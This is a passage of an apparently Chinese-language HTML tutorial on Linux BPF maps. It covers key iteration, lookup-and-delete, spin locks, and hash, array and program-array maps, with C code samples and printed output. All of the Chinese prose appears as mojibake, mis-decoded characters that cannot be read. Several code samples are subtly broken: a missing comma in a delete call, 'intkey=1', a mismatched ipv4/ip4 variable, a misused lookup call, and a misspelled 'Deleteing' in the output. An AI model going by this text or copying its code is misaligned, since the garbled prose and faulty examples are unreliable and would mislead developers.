å°„ä¸­çš„å€¼ã€‚å¦‚æœç¨‹åºçš„å¦ä¸€éƒ¨åˆ†åœ¨å¾ªç¯éå†å€¼æ—¶ä»<code>map</code>ä¸­åˆ é™¤äº†ä¸€ä¸ªå…ƒç´ ï¼Œåˆ™<code>bpf_map_get_next_key</code>å°†é‡æ–°å¼€å§‹è¿›è¡Œéå†ã€‚ è®©æˆ‘ä»¬çœ‹ä¸€ä¸ªä¾‹å­ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> next_key, lookup_key; </span><br><span class="line">lookup_key = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">while</span>(bpf_map_get_next_key(map_data[<span class="number">0</span>].fd, &amp;lookup_key, &amp;next_key) == <span class="number">0</span>) &#123; </span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"The next key in the map is: '%d'\n"</span>, next_key);</span><br><span class="line"><span class="keyword">if</span> (next_key == <span class="number">2</span>) &#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Deleting key '2'\n"</span>);</span><br><span class="line">    bpf_map_delete_element(map_data[<span class="number">0</span>].fd &amp;next_key);</span><br><span class="line">&#125;</span><br><span class="line">    lookup_key = next_key;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¯¥ç¨‹åºçš„æ‰“å°è¾“å‡ºå¦‚ä¸‹</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">The next key in the map is: '1'</span><br><span class="line">The next key in the map is: '2'</span><br><span class="line">Deleteing key '2'</span><br><span class="line">The next key in the map is: '1'</span><br><span class="line">The next key in the map is: '3'</span><br><span class="line">The next key in the map is: '4'</span><br><span class="line">The next key in the map is: '5'</span><br></pre></td></tr></table></figure><h4 id="æŸ¥æ‰¾å’Œåˆ é™¤å…ƒç´ "><a href="#æŸ¥æ‰¾å’Œåˆ é™¤å…ƒç´ " class="headerlink" title="æŸ¥æ‰¾å’Œåˆ é™¤å…ƒç´ "></a>æŸ¥æ‰¾å’Œåˆ é™¤å…ƒç´ </h4><p>å†…æ ¸å…¬å¼€çš„å¦ä¸€ä¸ªç”¨äºå¤„ç†<code>map</code>çš„å‡½æ•°æ˜¯<code>bpf_map_lookup_and_delete_elem</code>ã€‚æ­¤å‡½æ•°åœ¨<code>map</code>ä¸­æœç´¢ç»™å®šé”®å¹¶ä»ä¸­åˆ é™¤å…ƒç´ ã€‚åŒæ—¶ï¼Œå®ƒæŠŠå…ƒç´ çš„å€¼å†™å…¥ä¸€ä¸ªå˜é‡ä¾›ç¨‹åºä½¿ç”¨ã€‚ å½“ä½ ä½¿ç”¨é˜Ÿåˆ—å’Œå †æ ˆæ˜ å°„æ—¶ï¼Œæ­¤å‡½æ•°ä¼šæ´¾ä¸Šç”¨åœºï¼Œè€Œä¸”ï¼Œå®ƒä¸ä»…é™äºä¸è¿™äº›ç±»å‹çš„æ˜ å°„ä¸€èµ·ä½¿ç”¨ã€‚ è®©æˆ‘ä»¬çœ‹ä¸€ä¸ªç¤ºä¾‹ï¼Œè¯´æ˜å¦‚ä½•å°†å®ƒä¸æˆ‘ä»¬åœ¨ä¹‹å‰ç¤ºä¾‹ä¸­ä½¿ç”¨çš„<code>map</code>ä¸€èµ·ä½¿ç”¨ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> key, value, result, it; </span><br><span class="line">key=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span>(it=<span class="number">0</span>;it&lt;<span class="number">2</span>;it++)&#123;</span><br><span class="line">result = bpf_map_lookup_and_delete_element(map_data[<span class="number">0</span>].fd, &amp;key, &amp;value); </span><br><span class="line">  <span class="keyword">if</span> (result == <span class="number">0</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Value read from the map: '%d'\n"</span>, value); </span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Failed to read value from the map: %d (%s)\n"</span>, result, strerror(errno));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œæˆ‘ä»¬å°è¯•ä»<code>map</code>ä¸­è·å–ç›¸åŒçš„å…ƒç´ ä¸¤æ¬¡ã€‚åœ¨ç¬¬ä¸€æ¬¡éå†ä¸­ï¼Œè¿™æ®µä»£ç å°†æ‰“å°<code>map</code>ä¸­å…ƒç´ çš„å€¼ã€‚ ä½†æ˜¯ï¼Œå› ä¸ºæˆ‘ä»¬ä½¿ç”¨çš„æ˜¯<code>bpf_map_lookup_and_delete_element</code>ï¼Œæ‰€ä»¥ç¬¬ä¸€æ¬¡éå†ä¹Ÿä¼šä»<code>map</code>ä¸­åˆ é™¤å…ƒç´ ã€‚ å¾ªç¯ç¬¬äºŒæ¬¡å°è¯•è·å–å…ƒç´ æ—¶ï¼Œæ­¤ä»£ç å°†å¤±è´¥ï¼Œå¹¶å°†ä½¿ç”¨â€œæœªæ‰¾åˆ°â€é”™è¯¯<code>ENOENT</code>å¡«å……<code>errno</code>å˜é‡ã€‚</p><h4 id="å¹¶å‘è®¿é—®mapå…ƒç´ "><a href="#å¹¶å‘è®¿é—®mapå…ƒç´ " class="headerlink" title="å¹¶å‘è®¿é—®mapå…ƒç´ "></a>å¹¶å‘è®¿é—®mapå…ƒç´ </h4><p>ä½¿ç”¨<code>BPF map</code>çš„æŒ‘æˆ˜ä¹‹ä¸€æ˜¯è®¸å¤šç¨‹åºå¯ä»¥åŒæ—¶è®¿é—®ç›¸åŒçš„<code>map</code>ã€‚è¿™å¯èƒ½ä¼šåœ¨æˆ‘ä»¬çš„BPFç¨‹åºä¸­å¼•å…¥ç«äº‰æ¡ä»¶ï¼Œå¹¶ä½¿<code>map</code>ä¸­çš„èµ„æºè®¿é—®å˜å¾—ä¸å¯é¢„æµ‹ã€‚ ä¸ºäº†é˜²æ­¢ç«äº‰æ¡ä»¶ï¼ŒBPFå¼•å…¥äº†BPFè‡ªæ—‹é”çš„æ¦‚å¿µï¼Œå®ƒå…è®¸ä½ åœ¨æ“ä½œ<code>map</code>å…ƒç´ æ—¶é”å®šå¯¹å®ƒçš„è®¿é—®ã€‚ è‡ªæ—‹é”ä»…é€‚ç”¨äºæ•°ç»„ã€æ•£åˆ—å’Œ<code>cgroup</code>å­˜å‚¨æ˜ å°„ã€‚</p><p>æœ‰ä¸¤ä¸ªBPFè¾…åŠ©å‡½æ•°å¯ç”¨äºå¤„ç†è‡ªæ—‹é”ï¼š<code>bpf_spin_lock</code>ç”¨äºé”å®šä¸€ä¸ªå…ƒç´ ï¼Œ<code>bpf_spin_unlock</code>å¯ä»¥è§£é”è¯¥å…ƒç´ ã€‚è¿™äº›è¾…åŠ©å‡½æ•°ä½¿ç”¨ä¿¡å·é‡çš„ç»“æ„æ¥è®¿é—®åŒ…å«æ­¤ä¿¡å·é‡çš„å…ƒç´ ã€‚ å½“ä¿¡å·é‡è¢«é”å®šæ—¶ï¼Œå…¶ä»–ç¨‹åºæ— æ³•è®¿é—®å…ƒç´ çš„å€¼ï¼Œå®ƒä»¬ä¼šä¸€ç›´ç­‰åˆ°ä¿¡å·é‡è¢«è§£é”ã€‚ åŒæ—¶ï¼ŒBPFè‡ªæ—‹é”å¼•å…¥äº†ä¸€ä¸ªæ–°çš„æ ‡å¿—ï¼Œç”¨æˆ·ç©ºé—´ç¨‹åºå¯ä»¥ä½¿ç”¨å®ƒæ¥æ”¹å˜é”çš„çŠ¶æ€ã€‚è¯¥æ ‡å¿—ç§°ä¸º<code>BPF_F_LOCK</code>ã€‚ä½¿ç”¨è‡ªæ—‹é”æˆ‘ä»¬éœ€è¦åšçš„ç¬¬ä¸€ä»¶äº‹æ˜¯åˆ›å»ºæˆ‘ä»¬æƒ³è¦é”å®šè®¿é—®çš„å…ƒç´ ï¼Œç„¶åæ·»åŠ æˆ‘ä»¬çš„ä¿¡å·é‡ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">concurrent_element</span> &#123;</span> </span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">bpf_spin_lock</span> <span class="title">semaphore</span>;</span> </span><br><span class="line">  <span class="keyword">int</span> count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬ä¼šæŠŠè¿™ä¸ªç»“æ„å­˜å‚¨åœ¨<code>BPF map</code>ä¸­ï¼Œå¹¶åœ¨å…ƒç´ ä¸­ä½¿ç”¨ä¿¡å·é‡æ¥é˜²æ­¢å¯¹å®ƒçš„ä¸å½“è®¿é—®ã€‚ ç°åœ¨ï¼Œæˆ‘ä»¬å¯ä»¥å£°æ˜å°†åŒ…å«è¿™äº›å…ƒç´ çš„<code>map</code>ã€‚ æ­¤<code>map</code>å¿…é¡»ä½¿ç”¨BPFç±»å‹æ ¼å¼(BTF)è¿›è¡Œæ³¨é‡Šï¼Œä»¥ä¾¿éªŒè¯å™¨çŸ¥é“ç»“æ„ã€‚ ç±»å‹æ ¼å¼é€šè¿‡å‘äºŒè¿›åˆ¶å¯¹è±¡æ·»åŠ è°ƒè¯•ä¿¡æ¯ï¼Œä½¿å†…æ ¸å’Œå…¶ä»–å·¥å…·å¯¹BPFæ•°æ®ç»“æ„æœ‰æ›´ä¸°å¯Œçš„ç†è§£ã€‚å› ä¸ºè¿™æ®µä»£ç å°†åœ¨å†…æ ¸ä¸­è¿è¡Œï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨<code>libbpf</code>æä¾›çš„å†…æ ¸å®æ¥æ³¨é‡Šè¿™ä¸ªå¹¶å‘æ˜ å°„ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct bpf_map_def <span class="title">SEC</span><span class="params">(<span class="string">"maps"</span>)</span> concurrent_map </span>= &#123; </span><br><span class="line">  .type = BPF_MAP_TYPE_HASH,</span><br><span class="line">.key_size = <span class="keyword">sizeof</span>(<span class="keyword">int</span>),</span><br><span class="line">.value_size = <span class="keyword">sizeof</span>(struct concurrent_element), </span><br><span class="line">  .max_entries = <span class="number">100</span>,</span><br><span class="line">&#125;;</span><br><span class="line">BPF_ANNOTATE_KV_PAIR(concurrent_map, <span class="keyword">int</span>, struct concurrent_element);</span><br></pre></td></tr></table></figure><p>åœ¨BPFç¨‹åºä¸­ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä¸¤ä¸ªé”è¾…åŠ©å‡½æ•°æ¥ä¿æŠ¤è¿™äº›å…ƒç´ å…å—ç«äº‰æ¡ä»¶çš„å½±å“ã€‚å³ä½¿ä¿¡å·é‡è¢«é”å®šï¼Œæˆ‘ä»¬çš„ç¨‹åºä¹Ÿä¿è¯èƒ½å¤Ÿå®‰å…¨åœ°ä¿®æ”¹å…ƒç´ çš„å€¼ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bpf_program</span><span class="params">(struct pt_regs *ctx)</span> </span>&#123; </span><br><span class="line">  <span class="keyword">int</span> key=<span class="number">0</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">concurrent_element</span> <span class="title">init_value</span> = &#123;</span>&#125;; </span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">concurrent_element</span> *<span class="title">read_value</span>;</span></span><br><span class="line">  bpf_map_create_elem(&amp;concurrent_map, &amp;key, &amp;init_value, BPF_NOEXIST);</span><br><span class="line">  read_value = bpf_map_lookup_elem(&amp;concurrent_map, &amp;key);</span><br><span class="line">  bpf_spin_lock(&amp;read_value-&gt;semaphore);</span><br><span class="line">  read_value-&gt;count += <span class="number">100</span>;</span><br><span class="line">  bpf_spin_unlock(&amp;read_value-&gt;semaphore);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸Šè¿°ä»£ç é€šè¿‡åˆå§‹åŒ–æˆ‘ä»¬çš„å¹¶å‘æ˜ å°„æ¥é”å®šå¯¹å…¶å€¼çš„è®¿é—®ã€‚ ç„¶åï¼Œå®ƒä»æ˜ å°„ä¸­è·å–è¯¥å€¼å¹¶é”å®šå…¶ä¿¡å·é‡ï¼Œä»¥ä¾¿å®ƒå¯ä»¥ä¿å­˜è®¡æ•°å€¼ï¼Œä»è€Œé˜²æ­¢æ•°æ®ç«äº‰ã€‚ ä½¿ç”¨å®Œè¯¥å€¼åï¼Œå®ƒä¼šé‡Šæ”¾é”ï¼Œä»¥ä¾¿å…¶ä»–æ˜ å°„å¯ä»¥å®‰å…¨åœ°è®¿é—®è¯¥å…ƒç´ ã€‚</p><p>åœ¨ç”¨æˆ·ç©ºé—´ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ä½¿ç”¨æ ‡å¿—<code>BPF_F_LOCK</code>æ¥ä¿å­˜å¯¹å¹¶å‘æ˜ å°„ä¸­å…ƒç´ çš„å¼•ç”¨ã€‚ä½ å¯ä»¥å°†æ­¤æ ‡å¿—ä¸<code>bpf_map_update_elem</code>å’Œ<code>bpf_map_lookup_elem_flags</code>è¾…åŠ©å‡½æ•°ä¸€èµ·ä½¿ç”¨ã€‚ è¿™ä¸ªæ ‡å¿—å…è®¸ä½ æ›´æ–°å…ƒç´ è€Œä¸ç”¨æ‹…å¿ƒæ•°æ®ç«äº‰ã€‚</p><p>è‡ªæ—‹é”å¹¶ä¸æ€»æ˜¯æœ‰ç”¨ã€‚ å¦‚æœæ‚¨åªæ˜¯åœ¨<code>map</code>ä¸­èšåˆå€¼ï¼Œåˆ™ä¸éœ€è¦ä½¿ç”¨è‡ªæ—‹é”ã€‚ ä½†æ˜¯ï¼Œå¦‚æœä½ æƒ³ç¡®ä¿å¹¶å‘ç¨‹åºåœ¨å¯¹å®ƒä»¬æ‰§è¡Œå¤šä¸ªæ“ä½œæ—¶ä¸ä¼šæ›´æ”¹æ˜ å°„ä¸­çš„å…ƒç´ ï¼Œä»è€Œä¿æŒåŸå­æ€§ï¼Œé‚£ä¹ˆè‡ªæ—‹é”å°±å¾ˆæœ‰ç”¨ã€‚</p><h3 id="BPFæ˜ å°„ç±»å‹"><a href="#BPFæ˜ å°„ç±»å‹" class="headerlink" title="BPFæ˜ å°„ç±»å‹"></a>BPFæ˜ å°„ç±»å‹</h3><h4 id="å“ˆå¸Œè¡¨æ˜ å°„"><a href="#å“ˆå¸Œè¡¨æ˜ å°„" class="headerlink" title="å“ˆå¸Œè¡¨æ˜ å°„"></a>å“ˆå¸Œè¡¨æ˜ å°„</h4><p>å“ˆå¸Œè¡¨æ˜ å°„æ˜¯ç¬¬ä¸€ä¸ªæ·»åŠ åˆ°BPFçš„é€šç”¨æ˜ å°„ã€‚ å®ƒä»¬ä½¿ç”¨<code>BPF_MAP_TYPE_HASH</code>ç±»å‹å®šä¹‰ã€‚ä½ å¯ä»¥ä½¿ç”¨ä»»ä½•å¤§å°çš„é”®å’Œå€¼ï¼Œ å†…æ ¸ä¼šæ ¹æ®éœ€è¦åˆ†é…å’Œé‡Šæ”¾å®ƒä»¬ã€‚å½“ä½ åœ¨å“ˆå¸Œè¡¨æ˜ å°„ä¸Šä½¿ç”¨<code>bpf_map_update_elem</code>æ—¶ï¼Œå†…æ ¸ä¼šè‡ªåŠ¨æ›¿æ¢å…ƒç´ ã€‚å“ˆå¸Œè¡¨æ˜ å°„ç»è¿‡ä¼˜åŒ–ï¼ŒæŸ¥æ‰¾é€Ÿåº¦éå¸¸å¿«ï¼Œå®ƒä»¬å¯¹äºä¿å­˜ç»å¸¸è¯»å–çš„ç»“æ„åŒ–æ•°æ®å¾ˆæœ‰ç”¨ã€‚è®©æˆ‘ä»¬çœ‹ä¸€ä¸ªä½¿ç”¨å®ƒä»¬æ¥è·Ÿè¸ªç½‘ç»œIPåŠå…¶é€Ÿç‡é™åˆ¶çš„ç¤ºä¾‹ç¨‹åºï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">#<span class="meta-keyword">define</span> IPV4_FAMILY 1</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ip_key</span> &#123;</span> </span><br><span class="line">  <span class="keyword">union</span> &#123;</span><br><span class="line">        __u32 v4_addr;</span><br><span class="line">        __u8 v6_addr[<span class="number">16</span>];</span><br><span class="line">      &#125;;</span><br><span class="line">      __u8 family;</span><br><span class="line">    &#125;;</span><br><span class="line"><span class="function">struct bpf_map_def <span class="title">SEC</span><span class="params">(<span class="string">"maps"</span>)</span> counters </span>= &#123; </span><br><span class="line">  .type = BPF_MAP_TYPE_HASH, </span><br><span class="line">  .key_size = <span class="keyword">sizeof</span>(struct ip_key), </span><br><span class="line">  .value_size = <span class="keyword">sizeof</span>(<span class="keyword">uint64_t</span>), </span><br><span class="line">  .max_entries = <span class="number">100</span>,</span><br><span class="line">.map_flags =BPF_F_NO_PREALLOC </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>åœ¨è¿™æ®µä»£ç ä¸­ï¼Œæˆ‘ä»¬å£°æ˜äº†ä¸€ä¸ªç»“æ„åŒ–çš„<code>key</code>ï¼Œæˆ‘ä»¬å°†ä½¿ç”¨å®ƒæ¥ä¿å­˜æœ‰å…³IPåœ°å€çš„ä¿¡æ¯ã€‚ æˆ‘ä»¬å®šä¹‰äº†æˆ‘ä»¬çš„ç¨‹åºå°†ç”¨æ¥è·Ÿè¸ªé€Ÿç‡é™åˆ¶çš„æ˜ å°„ã€‚ä½ å¯ä»¥çœ‹åˆ°æˆ‘ä»¬åœ¨æ­¤æ˜ å°„ä¸­ä½¿ç”¨IPåœ°å€ä½œä¸ºé”®ã€‚ è¿™äº›å€¼å°†æ˜¯æˆ‘ä»¬çš„BPFç¨‹åºä»ç‰¹å®šIPåœ°å€æ¥æ”¶ç½‘ç»œæ•°æ®åŒ…çš„é¢‘ç‡æ¬¡æ•°ã€‚</p><p>æˆ‘ä»¬å¯ä»¥ç¼–å†™ä¸€ä¸ªä»£ç ç‰‡æ®µæ¥æ›´æ–°å†…æ ¸ä¸­çš„è¿™äº›è®¡æ•°å™¨ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">update_counter</span><span class="params">(<span class="keyword">uint32_t</span> ipv4)</span> </span>&#123; </span><br><span class="line">  <span class="keyword">uint64_t</span> value;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ip_key</span> <span class="title">key</span> = &#123;</span>&#125;;</span><br><span class="line">key.v4_addr = ip4;</span><br><span class="line">key.family = IPV4_FAMILY;</span><br><span class="line">  bpf_map_lookup_elem(counters, &amp;key, &amp;value);</span><br><span class="line">  (*value) += <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¯¥å‡½æ•°è·å–ä»ç½‘ç»œæ•°æ®åŒ…ä¸­æå–çš„IPåœ°å€ï¼Œå¹¶ä½¿ç”¨æˆ‘ä»¬å£°æ˜çš„å¤åˆé”®æ‰§è¡Œæ˜ å°„æŸ¥æ‰¾ã€‚ åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å‡è®¾æˆ‘ä»¬ä¹‹å‰å·²ç»ç”¨é›¶å€¼åˆå§‹åŒ–äº†è®¡æ•°å™¨ï¼› å¦åˆ™ï¼Œ<code>bpf_map_lookup_elem</code>è°ƒç”¨å°†è¿”å›ä¸€ä¸ªè´Ÿæ•°ã€‚</p><h4 id="æ•°ç»„æ˜ å°„"><a href="#æ•°ç»„æ˜ å°„" class="headerlink" title="æ•°ç»„æ˜ å°„"></a>æ•°ç»„æ˜ å°„</h4><p>æ•°ç»„æ˜ å°„æ˜¯æ·»åŠ åˆ°å†…æ ¸çš„ç¬¬äºŒç§ç±»å‹çš„BPFæ˜ å°„ã€‚ å®ƒä»¬ä½¿ç”¨<code>BPF_MAP_TYPE_ARRAY</code>ç±»å‹å®šä¹‰ã€‚ å½“ä½ åˆå§‹åŒ–ä¸€ä¸ªæ•°ç»„æ˜ å°„æ—¶ï¼Œå®ƒçš„æ‰€æœ‰å…ƒç´ éƒ½é¢„å…ˆåˆ†é…åœ¨å†…å­˜ä¸­å¹¶è®¾ç½®ä¸ºé›¶å€¼ã€‚ å› ä¸ºè¿™äº›æ˜ å°„æ˜¯ç”±ä¸€ä¸ªå…ƒç´ åˆ‡ç‰‡æ”¯æŒçš„ï¼Œæ‰€ä»¥é”®æ˜¯æ•°ç»„ä¸­çš„ç´¢å¼•ï¼Œå®ƒä»¬çš„å¤§å°å¿…é¡»æ­£å¥½æ˜¯å››ä¸ªå­—èŠ‚ã€‚ä½¿ç”¨æ•°ç»„æ˜ å°„çš„ä¸€ä¸ªç¼ºç‚¹æ˜¯æ— æ³•åˆ é™¤æ˜ å°„ä¸­çš„å…ƒç´ ï¼Œå¹¶ä¸”æ— æ³•ä½¿æ•°ç»„å°äºå®é™…å€¼ã€‚å¦‚æœä½ å°è¯•åœ¨æ•°ç»„æ˜ å°„ä¸Šä½¿ç”¨<code>map_delete_elem</code>ï¼Œè°ƒç”¨å°†å¤±è´¥ï¼Œç»“æœä¼šæ”¶åˆ°é”™è¯¯<code>EINVAL</code>ã€‚</p><p>æ•°ç»„æ˜ å°„é€šå¸¸ç”¨äºå­˜å‚¨å¯ä»¥æ”¹å˜å€¼çš„ä¿¡æ¯ï¼Œä½†å®ƒçš„è¡Œä¸ºé€šå¸¸æ˜¯å›ºå®šçš„ã€‚ äººä»¬ä½¿ç”¨å®ƒæ¥å­˜å‚¨å…·æœ‰é¢„å®šä¹‰åˆ†é…è§„åˆ™çš„å…¨å±€å˜é‡ã€‚å› ä¸ºä½ ä¸èƒ½åˆ é™¤å…ƒç´ ï¼Œæ‰€ä»¥å¯ä»¥å‡è®¾ç‰¹å®šä½ç½®çš„å…ƒç´ æ€»æ˜¯ä»£è¡¨åŒä¸€ä¸ªå…ƒç´ ã€‚è¦è®°ä½çš„å¦ä¸€ä»¶äº‹æ˜¯<code>map_update_elem</code>ä¸æ˜¯åŸå­çš„ï¼Œå°±åƒä½ åœ¨å“ˆå¸Œè¡¨æ˜ å°„ä¸­çœ‹åˆ°çš„é‚£æ ·ã€‚å¦‚æœæ­£åœ¨è¿›è¡Œæ›´æ–°ï¼ŒåŒä¸€ç¨‹åºå¯ä»¥åŒæ—¶ä»åŒä¸€ä½ç½®è¯»å–ä¸åŒçš„å€¼ã€‚ å¦‚æœå°†è®¡æ•°å™¨å­˜å‚¨åœ¨æ•°ç»„æ˜ å°„ä¸­ï¼Œåˆ™å¯ä»¥ä½¿ç”¨å†…æ ¸çš„å†…ç½®å‡½æ•°<code>__sync_fetch_and_add</code>å¯¹æ˜ å°„çš„å€¼æ‰§è¡ŒåŸå­æ“ä½œã€‚</p><h4 id="ç¨‹åºæ•°ç»„æ˜ å°„"><a href="#ç¨‹åºæ•°ç»„æ˜ å°„" class="headerlink" title="ç¨‹åºæ•°ç»„æ˜ å°„"></a>ç¨‹åºæ•°ç»„æ˜ å°„</h4><p>ç¨‹åºæ•°ç»„æ˜ å°„æ˜¯ç¬¬ä¸€ä¸ªæ·»åŠ åˆ°å†…æ ¸çš„ä¸“ç”¨æ˜ å°„ã€‚å®ƒä»¬ä½¿ç”¨<code>BPF_MAP_TYPE_PROG_ARRAY</code>ç±»å‹å®šä¹‰ã€‚ ä½ å¯ä»¥ä½¿ç”¨è¿™ç§ç±»å‹çš„æ˜ å°„æ¥å­˜å‚¨å¯¹BPFç¨‹åºçš„æ–‡ä»¶æè¿°ç¬¦æ ‡è¯†ç¬¦çš„å¼•ç”¨ã€‚ ä¸è¾…åŠ©å‡½æ•°<code>bpf_tail_call</code>ç»“åˆä½¿ç”¨ï¼Œæ­¤æ˜ å°„å…è®¸ä½ åœ¨ç¨‹åºä¹‹é—´è·³è½¬ï¼Œç»•è¿‡å•ä¸ªBPFç¨‹åºçš„æœ€å¤§æŒ‡ä»¤é™åˆ¶å¹¶é™ä½å¤æ‚æ€§ã€‚</p><p>ä½¿ç”¨æ­¤ä¸“ç”¨æ˜ å°„æ—¶éœ€è¦è€ƒè™‘ä¸€äº›äº‹é¡¹ã€‚è¦è®°ä½çš„ç¬¬ä¸€ä¸ªæ–¹é¢æ˜¯é”®å’Œå€¼çš„å¤§å°éƒ½å¿…é¡»æ˜¯å››ä¸ªå­—èŠ‚ã€‚è¦è®°ä½çš„ç¬¬äºŒä¸ªæ–¹é¢æ˜¯ï¼Œå½“ä½ è·³è½¬åˆ°ä¸€ä¸ªæ–°ç¨‹åºæ—¶ï¼Œæ–°ç¨‹åºå°†é‡ç”¨ç›¸åŒçš„å†…å­˜å †æ ˆï¼Œå› æ­¤ç¨‹åºä¸ä¼šæ¶ˆè€—æ‰€æœ‰å¯ç”¨å†…å­˜ã€‚æœ€åï¼Œå¦‚æœä½ å°è¯•è·³è½¬åˆ°æ˜ å°„ä¸­ä¸å­˜åœ¨çš„ç¨‹åºï¼Œåˆ™å°¾è°ƒç”¨å°†å¤±è´¥ï¼Œå½“å‰ç¨‹åºå°†ç»§ç»­æ‰§è¡Œã€‚è®©æˆ‘ä»¬æ·±å…¥ç ”ç©¶ä¸€ä¸ªè¯¦ç»†çš„ç¤ºä¾‹ï¼Œä»¥äº†è§£å¦‚ä½•æ›´å¥½åœ°ä½¿ç”¨è¿™ç§ç±»å‹çš„æ˜ å°„ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct bpf_map_def <span class="title">SEC</span><span class="params">(<span class="string">"maps"</span>)</span> programs </span>= &#123; </span><br><span class="line">  .type = BPF_MAP_TYPE_PROG_ARRAY, </span><br><span class="line">  .key_size = <span class="number">4</span>,</span><br><span class="line">.value_size = <span class="number">4</span>,</span><br><span class="line">  .max_entries = <span class="number">1024</span>,</span><br><span class="line">    &#125;;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆï¼Œæˆ‘ä»¬éœ€è¦å£°æ˜æˆ‘ä»¬çš„æ–°ç¨‹åºæ˜ å°„ï¼ˆæ­£å¦‚æˆ‘ä»¬å‰é¢æåˆ°çš„ï¼Œé”®å’Œå€¼çš„å¤§å°æ€»æ˜¯å››ä¸ªå­—èŠ‚ï¼‰</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">intkey=<span class="number">1</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn</span> <span class="title">prog</span>[] = &#123;</span></span><br><span class="line">BPF_MOV64_IMM(BPF_REG_0, <span class="number">0</span>), <span class="comment">// assign r0 = 0</span></span><br><span class="line">BPF_EXIT_INSN(), <span class="comment">// return r0 </span></span><br><span class="line">&#125;;</span><br><span class="line">prog_fd = bpf_prog_load(BPF_PROG_TYPE_KPROBE, prog, <span class="keyword">sizeof</span>(prog), <span class="string">"GPL"</span>); </span><br><span class="line">bpf_map_update_elem(&amp;programs, &amp;key, &amp;prog_fd, BPF_ANY);</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬éœ€è¦å£°æ˜æˆ‘ä»¬è¦è·³è½¬åˆ°çš„ç¨‹åºã€‚ åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬æ­£åœ¨ç¼–å†™ä¸€ä¸ªBPFç¨‹åºï¼Œå…¶å”¯ä¸€ç›®çš„æ˜¯è¿”å›0ã€‚æˆ‘ä»¬ä½¿ç”¨<code>bpf_prog_load</code>å°†å…¶åŠ è½½åˆ°å†…æ 